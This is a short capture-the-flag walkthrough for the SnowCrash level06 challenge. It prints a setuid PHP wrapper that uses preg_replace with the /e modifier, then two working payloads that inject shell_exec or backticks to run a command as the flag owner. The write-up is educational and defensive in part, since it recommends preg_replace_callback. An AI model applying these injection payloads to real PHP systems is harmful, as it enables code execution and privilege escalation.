
We can see that the level06 has extended permission, and it can be run with the level06 user 


level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile


By organizing the source code of level06.php, we can see that there's the /e that permit to execute the matches in the preg_replace, very bad practice.

NB: to avoid this vulnerability never use it this way, better use preg_replace_callback

level06@SnowCrash:~$ cat /tmp/level06.php
#!/usr/bin/php

<?php
	function y($m)
	 {
		 $m = preg_replace("/\./", " x ", $m);
		 $m = preg_replace("/@/", " y", $m);
		 return $m; 
	}

	function x($y, $z)
	{
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
// we should manage our selft to match the getflag here. so [x getflag] should match  
		$a = preg_replace("/\[/", "(", $a); 
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	 }
	
	$r = x($argv[1], $argv[2]); 
	print $r;
?>

echo -e '[x {${shell_exec(getflag)}}]' > /tmp/file && ./level06 /tmp/file

or 

echo -e "[x \${\`getflag\`}]" > /tmp/file && ./level06 /tmp/file

and bingo



